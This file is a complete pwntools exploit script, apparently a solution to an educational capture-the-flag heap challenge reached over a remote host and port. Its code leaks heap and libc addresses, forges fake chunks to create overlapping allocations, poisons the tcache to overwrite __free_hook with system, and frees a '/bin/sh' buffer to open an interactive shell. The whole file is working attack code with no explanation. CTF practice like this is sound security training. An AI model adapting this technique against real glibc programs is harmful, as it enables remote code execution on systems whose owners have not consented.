#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#r = process('./chal', aslr=False)
r = remote('edu-ctf.zoolab.org', 10015)

def add(idx):
    r.sendlineafter('> ', '1')
    r.sendlineafter('> ', str(idx))

def edit(idx, sz, data):
    r.sendlineafter('> ', '2')
    r.sendlineafter('> ', str(idx))
    r.sendlineafter('> ', str(sz))
    r.send(data)

def delete(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter('> ', str(idx))

def show():
    r.sendlineafter('> ', '4')

for i in range(10):
    add(i)
for i in range(10):
    edit(i, 0x78, 'A')
for i in reversed(range(10)):
    delete(i)

add(0)
edit(0, 0x78, 'A')
show()
r.recvuntil('[0] ')
heap = u64(r.recv(6).ljust(8, b'\x00')) - 0x541
info(f"heap: {hex(heap)}")

for i in range(1, 7):
    add(i)
for i in range(1, 7):
    edit(i, 0x78, 'A')

add(7)
add(8)
edit(8, 0x78, 'A')
delete(8)

fake_chunk_off = 0x870 # at chunk 6
edit(7, 0x8, p64(heap + fake_chunk_off))

add(8)
add(9)
edit(8, 0x78, 'A') # data pointer same as chunk 7
edit(9, 0x78, 'A') # overlap with chunk 6 data

fake_chunk = flat(
    0, 0x421
)
edit(6, len(fake_chunk), fake_chunk)
# we only need chunk 6, 7 and 9
# and need to spray fake next chunk
l = [0,1,2,8,3,4,5]
for i in l:
    delete(i)
for i in l:
    add(i)
for i in l:
    edit(i, 0x68, 'B')

for i in l:
    delete(i)
for i in l:
    add(i)

add(0xe)
add(0xf)
edit(0xf, 0x38, 'OWO') # for padding
for i in l:
    edit(i, 0x58, b'\x00' * 0x18 + p64(0x21) + b'\x00'*0x18 + p64(0x21))

delete(9)
edit(0xe, 0x48, 'A')
show()
r.recvuntil('[14] ')
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ecf41
system = libc + 0x52290
__free_hook = libc + 0x1eee48
info(f"libc: {hex(libc)}")
add(0xd)
edit(0xd, 0x48, 'A')
delete(0xd)
delete(0xe)

fake_chunk = flat(
    0, 0x51,
    __free_hook - 0x8
)
edit(6, len(fake_chunk), fake_chunk)
add(0xd)
add(0xe)
edit(0xd, 0x48, 'A')
edit(0xe, 0x48, b'/bin/sh\x00' + p64(system))
delete(0xe)

r.interactive()
